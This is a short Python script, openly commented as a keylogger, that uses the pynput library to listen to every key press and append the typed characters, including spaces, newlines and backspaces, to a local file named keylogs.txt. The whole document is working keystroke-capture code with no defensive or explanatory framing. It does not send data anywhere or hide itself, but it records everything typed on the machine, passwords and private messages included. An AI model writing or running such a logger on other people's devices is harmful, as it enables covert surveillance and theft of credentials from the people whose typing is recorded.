from pynput.keyboard import Key, Listener

# Function to write the pressed key to a file
def write_to_file(key):
    keydata = str(key)
    keydata = keydata.replace("'", "")

    if keydata == 'Key.space':
        keydata = ' '
    elif keydata == 'Key.enter':
        keydata = '\n'
    elif keydata == 'Key.backspace':
        keydata = '[BACKSPACE]'
    else:
        keydata = keydata.replace('Key.', '')

    with open("keylogs.txt", "a") as f:
        f.write(keydata)

# Function to handle key press
def on_press(key):
    write_to_file(key)

# Function to handle key release (optional)
def on_release(key):
    pass

# Start the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
